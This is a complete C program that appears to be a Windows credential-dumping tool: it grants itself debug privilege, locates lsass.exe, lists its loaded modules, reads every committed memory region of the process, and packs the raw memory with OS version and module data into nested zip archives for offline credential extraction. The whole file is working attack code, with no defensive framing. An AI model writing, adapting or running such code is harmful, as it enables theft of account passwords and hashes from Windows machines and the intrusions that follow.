#include <stdio.h>
#include <windows.h>
#include "miniz.h"

// Constants
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define MAX_MODULES 1024


// Structs
typedef struct _TOKEN_PRIVILEGES_STRUCT {
    DWORD PrivilegeCount;
    LUID Luid;
    DWORD Attributes;
} TOKEN_PRIVILEGES_STRUCT, * PTOKEN_PRIVILEGES_STRUCT;

typedef struct {
    char base_dll_name[MAX_PATH];
    char full_dll_path[MAX_PATH];
    void* dll_base;
    int size;
} ModuleInformation;

typedef struct {
    char filename[20];
    unsigned char* content;
    size_t size;
} MemFile;

typedef struct {
    MemFile memfile_list[1024];
    int memfile_count;
    char barrel_json[256 * 256];
} BarrelResults;


// Enums
typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
} PROCESSINFOCLASS;


// Functions
// Lock
typedef LONG(WINAPI* RtlGetVersionPtr)(POSVERSIONINFOW);
// Shock
typedef NTSTATUS(WINAPI* NtOpenProcessTokenFn)(HANDLE, DWORD, PHANDLE);
typedef NTSTATUS(WINAPI* NtAdjustPrivilegesTokenFn)(HANDLE, BOOL, PTOKEN_PRIVILEGES_STRUCT, DWORD, PVOID, PVOID);
typedef NTSTATUS(WINAPI* NtGetNextProcessFn)(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
typedef NTSTATUS(WINAPI* NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* NtQueryVirtualMemory_t)(HANDLE, PVOID, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE);


// Skeletons
char* GetProcNameFromHandle(HANDLE handle);
char* ReadRemoteWStr(HANDLE processHandle, PVOID address);
PVOID ReadRemoteIntPtr(HANDLE processHandle, PVOID address);


// Get SeDebugPrivilege privilege
void EnableDebugPrivileges() {
    HANDLE currentProcess = GetCurrentProcess();
    HANDLE tokenHandle = NULL;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        exit(-1);
    }

    NtOpenProcessTokenFn NtOpenProcessToken = (NtOpenProcessTokenFn)GetProcAddress(hNtdll, "NtOpenProcessToken");
    NtAdjustPrivilegesTokenFn NtAdjustPrivilegesToken = (NtAdjustPrivilegesTokenFn)GetProcAddress(hNtdll, "NtAdjustPrivilegesToken");
    NtCloseFn NtClose = (NtCloseFn)GetProcAddress(hNtdll, "NtClose");

    if (!NtOpenProcessToken || !NtAdjustPrivilegesToken || !NtClose) {
        printf("[-] Error getting function addresses.\n");
        exit(-1);
    }

    // Open the process token
    NTSTATUS ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
    if (ntstatus != 0) {
        printf("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
        exit(-1);
    }

    // Set the privilege
    TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Luid.LowPart = 20; // LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid) would normally be used to get this value
    tokenPrivileges.Luid.HighPart = 0;
    tokenPrivileges.Attributes = 0x00000002;

    ntstatus = NtAdjustPrivilegesToken(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (ntstatus != 0) {
        printf("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X. Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue.\n", ntstatus);
        NtClose(tokenHandle);
        exit(-1);
    }

    // Close the handle
    if (tokenHandle != NULL) {
        NtClose(tokenHandle);
    }

    printf("[+] Debug privileges enabled successfully.\n");
}


ModuleInformation* add_module(ModuleInformation* list, int counter, ModuleInformation new_module) {
    static int size = MAX_MODULES;
    // If the list is full, reallocate memory to double the size
    if (counter >= size) {
        size *= 2;
        list = (ModuleInformation*)realloc(list, size * sizeof(ModuleInformation));
        if (list == NULL) {
            printf("[-] Memory allocation failed!\n");
            return NULL;
        }
    }
    list[counter] = new_module;
    return list;
}


ModuleInformation* CustomGetModuleHandle(HANDLE hProcess) {
    ModuleInformation* module_list = (ModuleInformation*)malloc(1024 * sizeof(ModuleInformation));
    int module_counter = 0;

    int process_basic_information_size = 48;
    int peb_offset = 0x8;
    int ldr_offset = 0x18;
    int inInitializationOrderModuleList_offset = 0x30;
    int flink_dllbase_offset = 0x20;
    int flink_buffer_fulldllname_offset = 0x40;
    int flink_buffer_offset = 0x50;

    BYTE pbi_byte_array[48];
    void* pbi_addr = (void*)pbi_byte_array;

    ////////////////////////////////
    // NtQueryInformationProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtQueryInformationProcessFn NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        printf("[-] Error getting NtQueryInformationProcess function address.\n");
        return NULL;
    }
    ////////////////////////////////

    ULONG ReturnLength;
    NTSTATUS ntstatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
    void* pebaddress = *(void**)peb_pointer;

    //printf("[+] pbi_addr: \t\t0x%p \n", pbi_addr);
    //printf("[+] peb pointer: \t0x%p\n", peb_pointer);
    printf("[+] PEB Address: \t0x%p\n", pebaddress);

    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);

    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

    printf("[+] Ldr Pointer: \t0x%p\n", ldr_pointer);
    printf("[+] Ldr Adress: \t0x%p\n", ldr_adress);
    // printf("[+] next_flink: \t0x%p\n", next_flink);

    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        // Get DLL base address
        dll_base = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));

        void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));

        // printf("[+] next_flink: %p\n", next_flink);
        // printf("[+] buffer: %p\n", buffer);
        char* base_dll_name = ReadRemoteWStr(hProcess, buffer);
        // printf("[+] base dll name: %s\n", base_dll_name);

        // New ModuleInformation
        ModuleInformation new_module;
        strncpy_s(new_module.base_dll_name, base_dll_name, MAX_PATH - 1);

        // Full DLL Path
        //void* full_dll_name_addr = (char*)next_flink + flink_buffer_fulldllname_offset;
        void* full_dll_name_addr = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_fulldllname_offset));
        // printf("[+] full_dll_name_addr: %p\n", full_dll_name_addr);

        char* full_dll_name = ReadRemoteWStr(hProcess, full_dll_name_addr);
        // printf("[+] base dll name: %s\n", base_dll_name);
        // printf("[+] full dll name: %s\n", full_dll_name);

        // Complete ModuleInformation         
        strncpy_s(new_module.full_dll_path, full_dll_name, MAX_PATH - 1);
        new_module.dll_base = dll_base;
        new_module.size = 0;
        add_module(module_list, module_counter, new_module);
        module_counter++;

        next_flink = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + 0x10));
    }

    return module_list;
}


// Read remote IntPtr (8-bytes)
PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    ///////////////////
    // Load NtQueryInformationProcess from Ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtReadVirtualMemoryFn NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    if (!NtReadVirtualMemory) {
        printf("[-] Error getting NtReadVirtualMemory function address.\n");
        return NULL;
    }
    ///////////////////

    BYTE buff[8];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
        return NULL;
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


// Read remote Unicode string
char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    ///////////////////
    // Load NtQueryInformationProcess from Ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtReadVirtualMemoryFn NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    if (!NtReadVirtualMemory) {
        printf("[-] Error getting NtReadVirtualMemory function address.\n");
        return NULL;
    }
    ///////////////////

    BYTE buff[256];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
    }

    static char unicode_str[128];
    int str_index = 0;

    for (int i = 0; i < sizeof(buff) - 1; i += 2) {
        if (buff[i] == 0 && buff[i + 1] == 0) {
            break;
        }
        wchar_t wch = *(wchar_t*)&buff[i];
        unicode_str[str_index++] = (char)wch;
    }
    unicode_str[str_index] = '\0';
    return unicode_str;
}


char* GetProcNameFromHandle(HANDLE process_handle) {
    const int process_basic_information_size = 48;
    const int peb_offset = 0x8;
    const int commandline_offset = 0x68;
    const int processparameters_offset = 0x20;

    /////////////////////
    // NtQueryInformationProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtQueryInformationProcessFn NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        printf("[-] Error getting NtQueryInformationProcess function address.\n");
        return NULL;
    }
    /////////////////////

    unsigned char pbi_byte_array[process_basic_information_size];
    void* pbi_addr = NULL;
    pbi_addr = (void*)pbi_byte_array;

    // Query process information
    ULONG returnLength;
    NTSTATUS ntstatus = NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    // Get PEB Base Address
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;

    // Get PEB->ProcessParameters
    PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);

    // Get ProcessParameters->CommandLine
    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);
    PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
    char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);

    /*
    // DEBUG
    printf("[+] pbi_addr: %p \n", pbi_addr);
    printf("[+] return length: %d \n", returnLength);
    printf("[+] peb pointer: %p\n", peb_pointer);
    printf("[+] peb address: %p\n", pebaddress);
    printf("[+] processparameters_pointer: %p\n", processparameters_pointer);
    printf("[+] processparameters_address: %p\n", processparameters_address);
    printf("[+] commandline_pointer: %p\n", commandline_pointer);
    printf("[+] commandline_address: %p\n", commandline_address);
    printf("[+] commandline_value: %s\n\n\n\n", commandline_value);
    */

    return commandline_value;
}


HANDLE GetProcessByName(const char* proc_name) {
    HANDLE aux_handle = NULL;
    /////////////////////
    // NtGetNextProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtGetNextProcessFn NtGetNextProcess = (NtGetNextProcessFn)GetProcAddress(hNtdll, "NtGetNextProcess");
    if (!NtGetNextProcess) {
        printf("[-] Error getting NtGetNextProcess function address.\n");
        return NULL;
    }
    /////////////////////

    // Iterate processes
    while (NT_SUCCESS(NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle))) {
        char* current_proc_name = GetProcNameFromHandle(aux_handle);
        //printf("aux_handle: %d\n", aux_handle);
        //printf("[+] current_proc_name: %s\n ", current_proc_name);
        if (current_proc_name && strcmp(current_proc_name, proc_name) == 0) {
            return aux_handle;
        }
    }
    return NULL;
}


// Function to find a module by name
ModuleInformation find_module_by_name(ModuleInformation* module_list, int list_size, const char* aux_name) {
    for (int i = 0; i < list_size; i++) {
        if (strcmp(module_list[i].base_dll_name, aux_name) == 0) {
            return module_list[i];  // Return a pointer to the matching module
        }
    }
    // no match is found
    ModuleInformation empty_module = { "", "", NULL, 0 };
    return empty_module;
}


// Function to find a module index by name
int find_module_index_by_name(ModuleInformation* module_list, int list_size, const char* aux_name) {
    for (int i = 0; i < list_size; i++) {
        if (strcmp(module_list[i].base_dll_name, aux_name) == 0) {
            return i;  // Return the index of the matching module
        }
    }
    return -1;  // Return -1 if no match is found
}


// Replace \ for \\ 
void replace_backslash(char* str, char* result) {
    int i, j = 0;
    for (i = 0; str[i] != '\0'; i++) {
        if (str[i] == '\\') {
            result[j++] = '\\';
            result[j++] = '\\';
        }
        else {
            result[j++] = str[i];
        }
    }
    result[j] = '\0';
}


// Function to generate a random string
void getRandomString(char* str, int length) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < length; i++) {
        int key = rand() % (int)(sizeof(charset) - 1);
        str[i] = charset[key];
    }
    str[length] = '\0';
}


// Convert an array to JSON (simplified for string array)
void toJson(char* json, const char* filename, const char* address, const char* regionSize) {
    sprintf_s(json, sizeof(json), "{\"filename\":\"%s\", \"address\":\"%s\", \"regionSize\":\"%s\"}", filename, address, regionSize);
}


// Function to generate a zip file from the memfile_list
void GenerateZip(const char* zipFilePath, MemFile memfile_list[], int memfile_count) {
    // Delete the existing file if it exists
    remove(zipFilePath);

    // Create and open the ZIP archive
    mz_zip_archive zip_archive;
    memset(&zip_archive, 0, sizeof(zip_archive));  // Initialize the structure
    if (!mz_zip_writer_init_file(&zip_archive, zipFilePath, 0)) {
        printf("Error: Could not initialize ZIP archive '%s'.\n", zipFilePath);
        return;
    }

    // Add each MemFile to the ZIP archive
    for (int i = 0; i < memfile_count; i++) {
        MemFile* m = &memfile_list[i];
        // Add the file entry to the ZIP archive
        if (!mz_zip_writer_add_mem(&zip_archive, m->filename, m->content, m->size, MZ_BEST_SPEED)) {
            printf("Error: Could not add file '%s' to the ZIP archive.\n", m->filename);
            mz_zip_writer_end(&zip_archive);  // Close the archive in case of error
            return;
        }
    }

    // Finalize and close the ZIP archive
    if (!mz_zip_writer_finalize_archive(&zip_archive)) {
        printf("Error: Could not finalize the ZIP archive.\n");
    }

    mz_zip_writer_end(&zip_archive);  // Always close the archive when done
    printf("[+] File %s generated.\n", zipFilePath);
}


BarrelResults Barrel(const char* filename, const char* zip_filename, LPVOID hProcess) {
    // Initialize variables
    BarrelResults results;
    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;
    int aux_size = 0;
    char aux_name[MAX_PATH] = "";
    MemFile memfile_list[1024];     // Fixed array for simplicity
    int memfile_count = 0;          // Track number of MemFiles
    char json_output[256 * 256] = "[";  // Buffer for JSON array
    char json_item[256];           // Buffer for each JSON object


    // Loop through the memory regions
    while ((long long)mem_address < proc_max_address_l) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;

        // Populate MEMORY_BASIC_INFORMATION struct
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        NtQueryVirtualMemory_t NtQueryVirtualMemory = (NtQueryVirtualMemory_t)GetProcAddress(ntdll, "NtQueryVirtualMemory");
        NTSTATUS ntstatus = NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);
        if (ntstatus != 0) {
            printf("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x%lx\n", ntstatus);
        }

        // If readable and committed -> Write memory region to a file
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            /*
            // Allocate buffer for memory content
            unsigned char* buffer = (unsigned char*) malloc(mbi.RegionSize);
            if (!buffer) {
                printf("Memory allocation failed\n");
                return 1;
            }
            */

            // Generate random filename
            char memdump_filename[14];
            getRandomString(memdump_filename, 10);
            strcat_s(memdump_filename, ".");
            getRandomString(memdump_filename + 11, 3);
            // printf("memdump_filename: %s\n", memdump_filename);

            // ReadProcessMemory(GetCurrentProcess(), mbi.BaseAddress, buffer, mbi.RegionSize, &bytesRead); /// UPDATE!!!!
            HMODULE hNtDll = LoadLibraryA("ntdll.dll");
            if (hNtDll == NULL) {
                printf("Failed to load ntdll.dll\n");
                return results;
            }

            // Get the address of NtReadVirtualMemory function.
            NtReadVirtualMemoryFn NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtDll, "NtReadVirtualMemory");
            // Buffer to store the read bytes
            SIZE_T regionSize = mbi.RegionSize;
            BYTE* buffer = (BYTE*)malloc(regionSize);
            if (buffer == NULL) {
                printf("Failed to allocate memory for buffer\n");
                return results;
            }
            SIZE_T bytesRead = 0;     // Number of bytes actually read

            // Call NtReadVirtualMemory to read the memory from the remote process
            NTSTATUS status = NtReadVirtualMemory(hProcess, mbi.BaseAddress, buffer, regionSize, &bytesRead);

            if (status != 0 && status != 0x8000000D) { // 0x8000000D = Partial copy so its ok
                printf("NtReadVirtualMemory failed with status: 0x%X\n", status);
            }

            // Format each JSON item: {"string", "0xVALUE1", "VALUE2"}
            sprintf_s(json_item, "{\"field0\":\"%s\", \"field1\":\"0x%p\", \"field2\":\"%d\"}, ", memdump_filename, mem_address, mbi.RegionSize);
            // Append the JSON item to the final JSON array
            strcat_s(json_output, json_item);

            // Add to MemFile array
            MemFile memFile;
            strcpy_s(memFile.filename, memdump_filename);
            memFile.content = buffer;
            memFile.size = mbi.RegionSize;
            memfile_list[memfile_count++] = memFile;
        }
        // printf("[+]\t0x%p\n", mem_address);
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
    }

    // Close handle
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        exit(-1);
    }
    NtCloseFn NtClose = (NtCloseFn)GetProcAddress(hNtdll, "NtClose");
    NtClose(hProcess);

    // Close the JSON array
    size_t len = strlen(json_output);
    json_output[len - 2] = '\0';
    strcat_s(json_output, "]");

    /*
    // Print the resulting JSON array
    // printf("4");
    // printf("%s\n", json_output);

    // Write to file
    FILE* file;
    errno_t err = fopen_s(&file, filename, "w");
    if (file == NULL) {
        printf("[-] Error opening file %s\n", filename);
        return 1;
    }
    fprintf(file, "%s", json_output);
    fclose(file);
    printf("[+] File %s generated.\n", filename);


    GenerateZip(zip_filename, memfile_list, memfile_count);
    */
    strncpy_s(results.barrel_json, json_output, strlen(json_output));
    results.memfile_count = memfile_count;
    memcpy(results.memfile_list, memfile_list, memfile_count*sizeof(MemFile));
    return results;
}


char* Shock(LPVOID* outputHandle) {
    EnableDebugPrivileges();
    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
    *outputHandle = (LPVOID)hProcess;
    printf("[+] Process handle:\t%d\n", hProcess);

    // List to get modules information
    ModuleInformation* moduleInformationList = CustomGetModuleHandle(hProcess);
    int module_counter = 0;

    for (int i = 0; i < MAX_MODULES; i++) {
        if (strcmp(moduleInformationList[i].base_dll_name, "")) {
            module_counter++;
            //printf("%d %s (%s)\n", module_counter, moduleInformationList[i].base_dll_name, moduleInformationList[i].full_dll_path);
        }
    }
    printf("[+] Processed %d modules\n", module_counter);

    // Initialize variables
    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;
    int aux_size = 0;
    char aux_name[MAX_PATH] = "";

    // Loop through the memory regions
    while ((long long)mem_address < proc_max_address_l) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;

        // Populate MEMORY_BASIC_INFORMATION struct
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        NtQueryVirtualMemory_t NtQueryVirtualMemory = (NtQueryVirtualMemory_t)GetProcAddress(ntdll, "NtQueryVirtualMemory");
        NTSTATUS ntstatus = NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);
        if (ntstatus != 0) {
            printf("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x%lx\n", ntstatus);
        }

        // If readable and committed --> Get information
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            // Find the module by name
            ModuleInformation aux_module = find_module_by_name(moduleInformationList, module_counter, aux_name);

            if (mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.dll_base) {
                aux_module.size = aux_size;
                // Find module index
                int aux_index = find_module_index_by_name(moduleInformationList, module_counter, aux_name);
                moduleInformationList[aux_index] = aux_module;
                for (int k = 0; k < module_counter; k++) {
                    if (mbi.BaseAddress == moduleInformationList[k].dll_base) {
                        strcpy_s(aux_name, moduleInformationList[k].base_dll_name);
                        aux_size = (int)mbi.RegionSize;
                    }
                }
            }
            else {
                aux_size += (int)mbi.RegionSize;
            }
        }
        // printf("%p\n", mem_address);
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
    }

    // Create JSON
    // char filename[] = "shock.json";
    char json_output[256 * 1000] = "[";  // Estimation
    for (int i = 0; i < module_counter; i++) {
        char full_dll_name_fixed[512];
        replace_backslash(moduleInformationList[i].full_dll_path, full_dll_name_fixed);

        if (moduleInformationList[i].dll_base != 0) {
            char json_item[512];
            sprintf_s(json_item, sizeof(json_item),
                "{\"field0\":\"%s\",\"field1\":\"%s\",\"field2\":\"0x%p\",\"field3\":\"%d\"}%s",
                moduleInformationList[i].base_dll_name,
                full_dll_name_fixed, // moduleInformationList[i].full_dll_path,
                moduleInformationList[i].dll_base,
                moduleInformationList[i].size,
                (i < module_counter - 1) ? "," : "");
            strcat_s(json_output, sizeof(json_output), json_item);
        }
    }
    size_t len = strlen(json_output);
    json_output[len - 1] = '\0';
    strcat_s(json_output, sizeof(json_output), "]");

    /*
    // Write to file
    FILE* file;
    errno_t err = fopen_s(&file, filename, "w");
    if (file == NULL) {
        printf("[-] Error opening file %s\n", filename);
        return 0;
    }
    fprintf(file, "%s", json_output);
    printf("5\n");
    // fclose(file);
    if (fclose(file) == EOF) {
        printf("[-] Error closing file %s.\n", filename);
        perror("Error closing file");

    }
    printf("6\n");
    printf("[+] File %s generated.\n", filename);
    */
    
    return json_output;
}


char* Lock() {
    ///////////////////////
    // RtlGetVersion
    HMODULE hModule = GetModuleHandleW(L"ntdll.dll");
    if (hModule == NULL) {
        printf("Error: Cannot get handle to ntdll.dll\n");
        return NULL;
    }
    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hModule, "RtlGetVersion");
    if (RtlGetVersion == NULL) {
        printf("Error: Cannot get address of RtlGetVersion\n");
        return NULL;
    }
    ///////////////////////
    OSVERSIONINFOW osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    if (RtlGetVersion(&osvi) == 0) {
        /*
        FILE* file;
        errno_t err = fopen_s(&file, filename, "w");
        if (err != 0) {
            printf("Error: Cannot open file for writing\n");
            return;
        }
        // Write JSON
        fprintf(file, "[{\"field0\" : \"%lu\" , \"field1\" : \"%lu\" , \"field2\" : \"%lu\"}]",
            osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        // Close handle
        fclose(file);
        printf("[+] File %s generated.\n", filename);
        */
        char json_output[256];  // Ensure this buffer is large enough

        // Use snprintf to format the string into the buffer
        snprintf(json_output, sizeof(json_output),
            "[{\"field0\" : \"%lu\" , \"field1\" : \"%lu\" , \"field2\" : \"%lu\"}]",
            osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);

        return json_output;
    }
    else {
        printf("Error: RtlGetVersion call failed\n");
        return NULL;
    }
}


// Function to create a nested zip from MemFiles in memory and return the zip data
unsigned char* create_nested_zip(MemFile* memfiles, size_t num_memfiles, size_t* out_size) {
    mz_zip_archive nested_zip;
    memset(&nested_zip, 0, sizeof(nested_zip));

    // Initialize a zip writer to memory
    if (!mz_zip_writer_init_heap(&nested_zip, 0, 0)) {
        printf("Failed to initialize nested zip archive\n");
        return NULL;
    }

    // Add each MemFile to the nested zip
    for (size_t i = 0; i < num_memfiles; i++) {
        if (!mz_zip_writer_add_mem(&nested_zip, memfiles[i].filename, memfiles[i].content, memfiles[i].size, MZ_BEST_COMPRESSION)) {
            printf("Failed to add file to nested zip: %s\n", memfiles[i].filename);
            mz_zip_writer_end(&nested_zip);
            return NULL;
        }
    }

    // Finalize the nested zip
    void* p_zip_mem = NULL;
    size_t zip_size = 0;
    if (!mz_zip_writer_finalize_heap_archive(&nested_zip, &p_zip_mem, &zip_size)) {
        printf("Failed to finalize nested zip\n");
        mz_zip_writer_end(&nested_zip);
        return NULL;
    }

    // Copy the zip data to a new buffer and return it
    unsigned char* zip_data = (unsigned char*)malloc(zip_size);
    memcpy(zip_data, p_zip_mem, zip_size);
    *out_size = zip_size;

    mz_zip_writer_end(&nested_zip);
    return zip_data;
}


// Function to create the outer zip file
int create_zip(const char* zip_name, const char* file1_name, const unsigned char* file1_content, size_t file1_size,
    const char* file2_name, const unsigned char* file2_content, size_t file2_size,
    const char* file3_name, const unsigned char* file3_content, size_t file3_size,
    const char* nested_zip_name, MemFile* memfiles, size_t num_memfiles) {

    mz_zip_archive outer_zip;
    memset(&outer_zip, 0, sizeof(outer_zip));

    // Start the outer zip archive.
    if (!mz_zip_writer_init_file(&outer_zip, zip_name, 0)) {
        printf("Failed to initialize outer zip archive: %s\n", zip_name);
        return -1;
    }

    // Add the three files to the outer zip archive
    if (!mz_zip_writer_add_mem(&outer_zip, file1_name, file1_content, file1_size, MZ_BEST_COMPRESSION)) {
        printf("Failed to add file: %s\n", file1_name);
        mz_zip_writer_end(&outer_zip);
        return -1;
    }

    if (!mz_zip_writer_add_mem(&outer_zip, file2_name, file2_content, file2_size, MZ_BEST_COMPRESSION)) {
        printf("Failed to add file: %s\n", file2_name);
        mz_zip_writer_end(&outer_zip);
        return -1;
    }

    if (!mz_zip_writer_add_mem(&outer_zip, file3_name, file3_content, file3_size, MZ_BEST_COMPRESSION)) {
        printf("Failed to add file: %s\n", file3_name);
        mz_zip_writer_end(&outer_zip);
        return -1;
    }

    // Create the nested zip file from the MemFiles
    size_t nested_zip_size;
    unsigned char* nested_zip_data = create_nested_zip(memfiles, num_memfiles, &nested_zip_size);
    if (nested_zip_data == NULL) {
        mz_zip_writer_end(&outer_zip);
        return -1;
    }

    // Add the nested zip file to the outer zip
    if (!mz_zip_writer_add_mem(&outer_zip, nested_zip_name, nested_zip_data, nested_zip_size, MZ_BEST_COMPRESSION)) {
        printf("Failed to add nested zip to the outer zip\n");
        free(nested_zip_data);
        mz_zip_writer_end(&outer_zip);
        return -1;
    }

    // Finalize and close the outer zip
    if (!mz_zip_writer_finalize_archive(&outer_zip)) {
        printf("Failed to finalize outer zip archive\n");
        free(nested_zip_data);
        mz_zip_writer_end(&outer_zip);
        return -1;
    }

    mz_zip_writer_end(&outer_zip);
    free(nested_zip_data);
    return 0;
}


int main(int argc, char* argv[]) {
    char lock_filename[] =   "lock.json";
    char shock_filename[] =  "shock.json";
    char barrel_filename[] = "barrel.json";
    char barrel_zip_filename[] = "barrel.zip";

    char* lock_json = Lock();
    // printf("osvi: %d\n", osvi.dwMajorVersion);
    LPVOID hProcess = NULL;
    char* shock_json = Shock(&hProcess);
    BarrelResults barrel_results = Barrel(barrel_filename, barrel_zip_filename, hProcess);
    
    // printf("%s\n", lock_json);
    // printf("%s\n", shock_json);
    // printf("%s\n", barrel_results.barrel_json);
    char* barrel_json = barrel_results.barrel_json;
    MemFile* memfile_list = barrel_results.memfile_list;
    int memfile_count = barrel_results.memfile_count;

    if (create_zip("trick.zip", lock_filename, (const unsigned char*)lock_json, strlen(lock_json),
        shock_filename, (const unsigned char*)shock_json, strlen(shock_json),
        barrel_filename, (const unsigned char*)barrel_json, strlen(barrel_json),
        barrel_zip_filename, memfile_list, memfile_count) == 0) {
        printf("[+] File %s generated.\n", barrel_zip_filename);
    }
    else {
        printf("[-] Failed to create %s.\n", barrel_zip_filename);
    }

    return 0;
}